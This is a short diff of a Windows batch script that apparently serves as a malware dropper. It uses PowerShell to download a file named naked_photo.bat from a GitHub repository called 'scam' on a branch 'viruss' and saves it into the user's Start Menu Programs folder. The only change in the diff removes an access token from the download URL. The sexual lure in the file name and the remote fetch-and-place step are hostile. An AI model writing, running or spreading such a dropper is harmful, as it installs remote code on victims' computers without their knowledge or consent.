@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 set "file_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\naked_photo.bat"
-set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/naked_photo.bat?token=GHSAT0AAAAAACWH3KDYWP5M425NKYN3HKEKZYCXMSQ"
+set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/naked_photo.bat"
 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%file_path%')"
 
